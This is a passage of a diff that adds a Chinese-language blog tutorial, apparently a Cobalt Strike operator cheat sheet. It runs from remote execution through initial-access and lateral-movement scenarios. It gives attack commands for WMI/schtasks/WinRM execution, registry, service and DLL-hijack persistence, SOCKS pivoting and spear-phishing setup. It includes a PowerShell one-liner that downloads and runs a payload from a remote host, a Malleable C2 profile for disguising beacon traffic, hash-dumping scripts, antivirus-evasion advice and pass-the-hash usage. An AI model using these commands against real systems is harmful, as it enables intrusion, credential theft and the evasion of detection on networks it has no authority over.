</span><span class="language-bash"><span class="hljs-built_in">link</span> &lt;目标IP&gt;</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">─── 也可以先注入 ───</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">inject &lt;目标进程PID&gt; smb_listener</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="12-5-远程执行"><a href="#12-5-远程执行" class="headerlink" title="12.5 远程执行"></a>12.5 远程执行</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># ─── WMI 远程执行 ───</span><br>beacon&gt; <span class="hljs-keyword">shell</span><span class="language-bash"> wmic /node:192.168.1.10 process call create <span class="hljs-string">&quot;cmd.exe /c whoami&quot;</span></span><br><br><span class="hljs-comment"># ─── SCHTASKS 计划任务 ───</span><br>beacon&gt; <span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s 192.168.1.10 /tn update /tr <span class="hljs-string">&quot;cmd.exe /c whoami &gt; c:\temp\out.txt&quot;</span> /sc once /st 00:00</span><br>beacon&gt; <span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s 192.168.1.10 /tn update</span><br><br><span class="hljs-comment"># ─── WinRM ───</span><br>beacon&gt; <span class="hljs-keyword">shell</span><span class="language-bash"> winrs -r:192.168.1.10 -u:admin -p:pass <span class="hljs-built_in">whoami</span></span><br></code></pre></td></tr></table></figure>
+
+<h3 id="12-6-内网代理-其他工具"><a href="#12-6-内网代理-其他工具" class="headerlink" title="12.6 内网代理 + 其他工具"></a>12.6 内网代理 + 其他工具</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ─── 开启 SOCKS 代理 ───</span><br><span class="hljs-attribute">beacon</span>&gt; socks <span class="hljs-number">1080</span><br><br><span class="hljs-comment"># ─── 在本地通过代理使用其他工具 ───</span><br><span class="hljs-comment"># proxychains 配置 127.0.0.1:1080</span><br><span class="hljs-attribute">proxychains</span> nmap -sT -Pn <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">proxychains</span> smbclient //<span class="hljs-number">192.168.1.10</span>/share<br><span class="hljs-attribute">proxychains</span> evil-winrm -i <span class="hljs-number">192.168.1.10</span> -u admin -p pass<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十三、持久化"><a href="#十三、持久化" class="headerlink" title="十三、持久化"></a>十三、持久化</h2><h3 id="13-1-注册表持久化"><a href="#13-1-注册表持久化" class="headerlink" title="13.1 注册表持久化"></a>13.1 注册表持久化</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># ─── 开机自启动 ───</span><br>beacon<span class="hljs-operator">&gt;</span> shell reg add <span class="hljs-string">&quot;HKCU<span class="hljs-char escape_">\S</span>oftware<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\R</span>un&quot;</span> <span class="hljs-symbol">/v</span> update <span class="hljs-symbol">/t</span> REG_SZ <span class="hljs-symbol">/d</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\p</span>ayload.exe&quot;</span> <span class="hljs-symbol">/f</span><br><br><span class="hljs-comment"># ─── 系统级 ───</span><br>beacon<span class="hljs-operator">&gt;</span> shell reg add <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>oftware<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\R</span>un&quot;</span> <span class="hljs-symbol">/v</span> update <span class="hljs-symbol">/t</span> REG_SZ <span class="hljs-symbol">/d</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\p</span>ayload.exe&quot;</span> <span class="hljs-operator">/</span>f<br></code></pre></td></tr></table></figure>
+
+<h3 id="13-2-计划任务"><a href="#13-2-计划任务" class="headerlink" title="13.2 计划任务"></a>13.2 计划任务</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">beacon&gt; <span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /tn update /tr <span class="hljs-string">&quot;C:\payload.exe&quot;</span> /sc onlogon /ru system</span><br>beacon&gt; <span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /tn update /tr <span class="hljs-string">&quot;C:\payload.exe&quot;</span> /sc minute /mo 30</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="13-3-服务"><a href="#13-3-服务" class="headerlink" title="13.3 服务"></a>13.3 服务</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">shell </span><span class="hljs-keyword">sc </span>create update <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;C:\payload.exe&quot;</span> start= auto<br><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">shell </span><span class="hljs-keyword">sc </span>start update<br></code></pre></td></tr></table></figure>
+
+<h3 id="13-4-WMI-事件订阅"><a href="#13-4-WMI-事件订阅" class="headerlink" title="13.4 WMI 事件订阅"></a>13.4 WMI 事件订阅</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment"># ─── 需要 SYSTEM 权限 ───</span><br>beacon&gt;<span class="hljs-built_in"> execute-assembly </span>WMIPersistence.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="13-5-DLL-劫持"><a href="#13-5-DLL-劫持" class="headerlink" title="13.5 DLL 劫持"></a>13.5 DLL 劫持</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># 将恶意 DLL 放在目标 DLL 搜索路径中</span><br>beacon&gt; upload malicious.dll C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Target\</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十四、端口转发与代理"><a href="#十四、端口转发与代理" class="headerlink" title="十四、端口转发与代理"></a>十四、端口转发与代理</h2><h3 id="14-1-SOCKS-代理"><a href="#14-1-SOCKS-代理" class="headerlink" title="14.1 SOCKS 代理"></a>14.1 SOCKS 代理</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ─── 开启 SOCKS 代理 ───</span><br><span class="hljs-attribute">beacon</span>&gt; socks <span class="hljs-number">1080</span><br><br><span class="hljs-comment"># ─── 本地配置 proxychains ───</span><br><span class="hljs-comment"># /etc/proxychains.conf</span><br><span class="hljs-comment"># socks4 127.0.0.1 1080</span><br><br><span class="hljs-comment"># ─── 使用代理 ───</span><br><span class="hljs-attribute">proxychains</span> curl http://<span class="hljs-number">192.168.1.10</span><br><span class="hljs-attribute">proxychains</span> nmap -sT -Pn <span class="hljs-number">192.168.1.10</span><br><span class="hljs-attribute">proxychains</span> rdesktop <span class="hljs-number">192.168.1.10</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="14-2-端口转发"><a href="#14-2-端口转发" class="headerlink" title="14.2 端口转发"></a>14.2 端口转发</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ─── 正向端口转发（目标端口 → 本地）───</span><br><span class="hljs-attribute">beacon</span>&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">192.168.1.10</span> <span class="hljs-number">80</span><br><span class="hljs-comment"># 访问本地 8080 → 实际访问目标内网 192.168.1.10:80</span><br><br><span class="hljs-comment"># ─── 反向端口转发（本地端口 → 目标）───</span><br><span class="hljs-attribute">beacon</span>&gt; rportfwd <span class="hljs-number">8443</span> <span class="hljs-number">10.10.10.1</span> <span class="hljs-number">443</span><br><br><span class="hljs-comment"># ─── 停止转发 ───</span><br><span class="hljs-attribute">beacon</span>&gt; rportfwd stop <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="14-3-CovertVPN"><a href="#14-3-CovertVPN" class="headerlink" title="14.3 CovertVPN"></a>14.3 CovertVPN</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># ─── 创建隐蔽 VPN ───</span><br>beacon&gt; covertvpn <span class="hljs-variable">&lt;接口名&gt;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十五、钓鱼攻击"><a href="#十五、钓鱼攻击" class="headerlink" title="十五、钓鱼攻击"></a>十五、钓鱼攻击</h2><h3 id="15-1-钓鱼邮件"><a href="#15-1-钓鱼邮件" class="headerlink" title="15.1 钓鱼邮件"></a>15.1 钓鱼邮件</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix">Attacks → Spear Phishing<br>  <span class="hljs-params">Targets:</span> 导入目标邮箱列表<br>  <span class="hljs-params">Template:</span> 钓鱼邮件模板<br>  <span class="hljs-params">Attachment:</span> 恶意附件（Office 宏 <span class="hljs-symbol">/</span> HTA 等）<br>  Mail <span class="hljs-params">Server:</span> SMTP 配置<br></code></pre></td></tr></table></figure>
+
+<h3 id="15-2-Web-交付"><a href="#15-2-Web-交付" class="headerlink" title="15.2 Web 交付"></a>15.2 Web 交付</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">Attacks → Web Drive-by → Scripted Web Delivery<br>  <span class="hljs-params">URI:</span> <span class="hljs-symbol">/update</span><br>  <span class="hljs-params">Listener:</span> https_listener<br>  <span class="hljs-params">Type:</span> PowerShell<br>  <span class="hljs-params">Host:</span> your-domain.com<br><br><span class="hljs-comment"># 生成一行命令，目标执行即可上线</span><br>powershell <span class="hljs-operator">-</span>nop <span class="hljs-operator">-</span>w hidden <span class="hljs-operator">-</span>c <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;https://your-domain.com/update&#x27;))&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="15-3-Web-克隆"><a href="#15-3-Web-克隆" class="headerlink" title="15.3 Web 克隆"></a>15.3 Web 克隆</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Attacks → Web Drive-<span class="hljs-keyword">by</span> → Clone Site<br>  <span class="hljs-built_in">URL</span>: 目标网站 <span class="hljs-built_in">URL</span>（如 <span class="hljs-keyword">https</span>://target.com/login）<br>  Local URI: /login<br>  Listener: https_listener<br></code></pre></td></tr></table></figure>
+
+<h3 id="15-4-文件签名克隆"><a href="#15-4-文件签名克隆" class="headerlink" title="15.4 文件签名克隆"></a>15.4 文件签名克隆</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 克隆合法程序的签名（提高载荷可信度）</span><br><span class="hljs-attribute">Attacks</span> → Packages → Windows Executable (S)<br>  → 勾选 <span class="hljs-string">&quot;Use a custom signing certificate&quot;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十六、Malleable-C2-配置文件"><a href="#十六、Malleable-C2-配置文件" class="headerlink" title="十六、Malleable C2 配置文件"></a>十六、Malleable C2 配置文件</h2><h3 id="16-1-概述"><a href="#16-1-概述" class="headerlink" title="16.1 概述"></a>16.1 概述</h3><p>Malleable C2 文件控制 Beacon 的 C2 通信流量特征，用于<strong>流量伪装</strong>，规避 IDS&#x2F;EDR 检测。</p>
+<h3 id="16-2-基本结构"><a href="#16-2-基本结构" class="headerlink" title="16.2 基本结构"></a>16.2 基本结构</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># ─── profile.profile 示例 ───</span><br><span class="hljs-built_in">set</span> sample_name <span class="hljs-string">&quot;My Profile&quot;</span>;<br><br><span class="hljs-comment"># HTTP GET 请求（Beacon 回连）</span><br>http-<span class="hljs-built_in">get</span> &#123;<br>    <span class="hljs-built_in">set</span> uri <span class="hljs-string">&quot;/api/v1/data /api/v2/users /health&quot;</span>;<br>    <br>   <span class="hljs-built_in"> client </span>&#123;<br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;application/json&quot;</span>;<br>        header <span class="hljs-string">&quot;User-Agent&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>;<br>        <br>        metadata &#123;<br>            base64;<br>            header <span class="hljs-string">&quot;Cookie&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>   <span class="hljs-built_in"> server </span>&#123;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/json&quot;</span>;<br>        <br>        output &#123;<br>            netbios;<br>            print;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># HTTP POST 请求（Beacon 回传数据）</span><br>http-post &#123;<br>    <span class="hljs-built_in">set</span> uri <span class="hljs-string">&quot;/api/v1/submit&quot;</span>;<br>    <br>   <span class="hljs-built_in"> client </span>&#123;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/json&quot;</span>;<br>        <br>        id &#123;<br>            netbios;<br>            parameter <span class="hljs-string">&quot;sid&quot;</span>;<br>        &#125;<br>        <br>        output &#123;<br>            print;<br>        &#125;<br>    &#125;<br>    <br>   <span class="hljs-built_in"> server </span>&#123;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/json&quot;</span>;<br>        <br>        output &#123;<br>            print;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># HTTPS 证书配置</span><br>https-certificate &#123;<br>    <span class="hljs-built_in">set</span> CN       <span class="hljs-string">&quot;www.example.com&quot;</span>;<br>    <span class="hljs-built_in">set</span> O        <span class="hljs-string">&quot;Example Corp&quot;</span>;<br>    <span class="hljs-built_in">set</span> C        <span class="hljs-string">&quot;US&quot;</span>;<br>    <span class="hljs-built_in">set</span> ST       <span class="hljs-string">&quot;California&quot;</span>;<br>    <span class="hljs-built_in">set</span> L        <span class="hljs-string">&quot;San Francisco&quot;</span>;<br>    <span class="hljs-built_in">set</span> validity <span class="hljs-string">&quot;365&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="16-3-常用预置-Profile"><a href="#16-3-常用预置-Profile" class="headerlink" title="16.3 常用预置 Profile"></a>16.3 常用预置 Profile</h3><table>
+<thead>
+<tr>
+<th>Profile</th>
+<th>来源</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>amazon.profile</code></td>
+<td>模仿 Amazon 流量</td>
+</tr>
+<tr>
+<td><code>google.profile</code></td>
+<td>模仿 Google 流量</td>
+</tr>
+<tr>
+<td><code>jquery-c2.4.2.profile</code></td>
+<td>模仿 jQuery 请求</td>
+</tr>
+<tr>
+<td><code>malleable-c2.4.2.profile</code></td>
+<td>官方示例</td>
+</tr>
+<tr>
+<td><code>amazon.profile</code></td>
+<td>AWS 风格</td>
+</tr>
+</tbody></table>
+<h3 id="16-4-使用-Profile"><a href="#16-4-使用-Profile" class="headerlink" title="16.4 使用 Profile"></a>16.4 使用 Profile</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 启动时指定 ───</span><br><span class="hljs-built_in">sudo</span> ./teamserver 192.168.1.100 P@ssw0rd! profile.profile<br><br><span class="hljs-comment"># ─── 验证 Profile 语法 ───</span><br>./c2lint profile.profile<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十七、Aggressor-Script-脚本"><a href="#十七、Aggressor-Script-脚本" class="headerlink" title="十七、Aggressor Script 脚本"></a>十七、Aggressor Script 脚本</h2><h3 id="17-1-概述"><a href="#17-1-概述" class="headerlink" title="17.1 概述"></a>17.1 概述</h3><p>Aggressor Script 是 Cobalt Strike 的脚本引擎，用于扩展功能、自定义菜单、自动化操作。</p>
+<h3 id="17-2-加载脚本"><a href="#17-2-加载脚本" class="headerlink" title="17.2 加载脚本"></a>17.2 加载脚本</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">Cobalt Strike → <span class="hljs-keyword">Script</span> Manager → <span class="hljs-keyword">Load</span><br>  选择 .cna 文件<br></code></pre></td></tr></table></figure>
+
+<h3 id="17-3-常用社区脚本"><a href="#17-3-常用社区脚本" class="headerlink" title="17.3 常用社区脚本"></a>17.3 常用社区脚本</h3><table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ElevateKit</code></td>
+<td>额外提权模块</td>
+</tr>
+<tr>
+<td><code>PersistenceKit</code></td>
+<td>额外持久化模块</td>
+</tr>
+<tr>
+<td><code>LateralMovementKit</code></td>
+<td>横向移动增强</td>
+</tr>
+<tr>
+<td><code>MimikatzKit</code></td>
+<td>Mimikatz 集成增强</td>
+</tr>
+<tr>
+<td><code>ProcessInjectionKit</code></td>
+<td>进程注入增强</td>
+</tr>
+<tr>
+<td><code>ArtifactKit</code></td>
+<td>载荷免杀增强</td>
+</tr>
+<tr>
+<td><code>Sleepmask</code></td>
+<td>Sleep Mask（内存规避）</td>
+</tr>
+<tr>
+<td><code>Situational Awareness</code></td>
+<td>态势感知脚本集</td>
+</tr>
+</tbody></table>
+<h3 id="17-4-自定义菜单"><a href="#17-4-自定义菜单" class="headerlink" title="17.4 自定义菜单"></a>17.4 自定义菜单</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 示例：添加右键菜单 ───</span><br>popup beacon_bottom &#123;<br>    item <span class="hljs-string">&quot;Run Whoami&quot;</span> &#123;<br>        binput(<span class="hljs-variable">$1</span>, <span class="hljs-string">&quot;whoami /all&quot;</span>);<br>        bpsexec(<span class="hljs-variable">$1</span>, <span class="hljs-string">&quot;whoami /all&quot;</span>);<br>    &#125;<br>    item <span class="hljs-string">&quot;Dump Hashes&quot;</span> &#123;<br>        binput(<span class="hljs-variable">$1</span>, <span class="hljs-string">&quot;hashdump&quot;</span>);<br>        blogonpasswords(<span class="hljs-variable">$1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十八、报告生成"><a href="#十八、报告生成" class="headerlink" title="十八、报告生成"></a>十八、报告生成</h2><h3 id="18-1-生成报告"><a href="#18-1-生成报告" class="headerlink" title="18.1 生成报告"></a>18.1 生成报告</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Reporting</span> → Activity Report          <span class="hljs-comment"># 活动报告</span><br>Reporting → Hosts Report             <span class="hljs-comment"># 主机报告</span><br>Reporting → Indicators of Compromise <span class="hljs-comment"># IoC 报告</span><br>Reporting → Social Engineering Report <span class="hljs-comment"># 社工报告</span><br>Reporting → Sessions Report          <span class="hljs-comment"># 会话报告</span><br>Reporting → Credentials Report       <span class="hljs-comment"># 凭据报告</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="18-2-自定义报告"><a href="#18-2-自定义报告" class="headerlink" title="18.2 自定义报告"></a>18.2 自定义报告</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Reporting</span> → <span class="hljs-meta">Export</span> <span class="hljs-meta">Data</span> → TSV<br>  导出为 TSV 格式，可导入 Excel<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十九、安全加固与规避"><a href="#十九、安全加固与规避" class="headerlink" title="十九、安全加固与规避"></a>十九、安全加固与规避</h2><h3 id="19-1-常见检测手段"><a href="#19-1-常见检测手段" class="headerlink" title="19.1 常见检测手段"></a>19.1 常见检测手段</h3><table>
+<thead>
+<tr>
+<th>检测层</th>
+<th>手段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>网络层</strong></td>
+<td>流量检测（IDS&#x2F;IPS）、C2 通信特征</td>
+</tr>
+<tr>
+<td><strong>主机层</strong></td>
+<td>EDR、进程监控、文件监控</td>
+</tr>
+<tr>
+<td><strong>行为层</strong></td>
+<td>横向移动检测、异常登录</td>
+</tr>
+</tbody></table>
+<h3 id="19-2-规避措施"><a href="#19-2-规避措施" class="headerlink" title="19.2 规避措施"></a>19.2 规避措施</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># ─── 流量加密 ───</span><br>使用 HTTPS Beacon + 正规 SSL 证书 + Malleable C2<br><br><span class="hljs-meta"># ─── 载荷免杀 ───</span><br>使用 Artifact Kit 生成免杀载荷<br>使用 <span class="hljs-built_in">Sleep</span> Mask 规避内存扫描<br>使用自定义 Beacon Stager<br><br><span class="hljs-meta"># ─── 进程注入 ───</span><br>使用更隐蔽的注入技术（Shinject / Syscalls）<br><br><span class="hljs-meta"># ─── 行为规避 ───</span><br>设置合理的 <span class="hljs-built_in">sleep</span> 时间（<span class="hljs-number">60</span><span class="hljs-number">-300</span>s）<br>使用 jitter（随机抖动）<br>避免在敏感时段操作<br>使用 VPN/代理中转流量<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二十、实战场景速查"><a href="#二十、实战场景速查" class="headerlink" title="二十、实战场景速查"></a>二十、实战场景速查</h2><h3 id="场景-1：初始访问（外部打点）"><a href="#场景-1：初始访问（外部打点）" class="headerlink" title="场景 1：初始访问（外部打点）"></a>场景 1：初始访问（外部打点）</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 创建 HTTPS 监听器（使用正规证书）<br><span class="hljs-bullet">2.</span> 使用 Malleable C2 配置流量伪装<br><span class="hljs-bullet">3.</span> 生成 Office 宏载荷<br><span class="hljs-bullet">4.</span> 钓鱼邮件发送<br><span class="hljs-bullet">5.</span> 目标打开文档 → Beacon 上线<br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-2：信息收集"><a href="#场景-2：信息收集" class="headerlink" title="场景 2：信息收集"></a>场景 2：信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">sysinfo</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">ipconfig</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell net user /domain</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">shell nltest /dclist</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">arp 192.168.1.0/24</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">portscan 192.168.1.0/24 445,3389,8080 arp 100</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-3：提权"><a href="#场景-3：提权" class="headerlink" title="场景 3：提权"></a>场景 3：提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">getsystem</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash"><span class="hljs-built_in">whoami</span> /priv</span><br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">elevate uac-token-duplication https_listener</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="场景-4：横向移动"><a href="#场景-4：横向移动" class="headerlink" title="场景 4：横向移动"></a>场景 4：横向移动</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">beacon&gt; </span>logonpasswords        <span class="hljs-comment"># 获取凭据</span><br><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">jump </span>psexec <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">10</span> https_listener<br><span class="hljs-keyword">beacon&gt; </span><span class="hljs-keyword">jump </span>winrm <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">20</span> https_listener<br><span class="hljs-keyword">beacon&gt; </span>socks <span class="hljs-number">1080</span>            <span class="hljs-comment"># 开代理</span><br>proxychains evil-winrm -i <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">30</span> -u admin -H &lt;NTLM&gt;<br></code></pre></td></tr></table></figure>
+
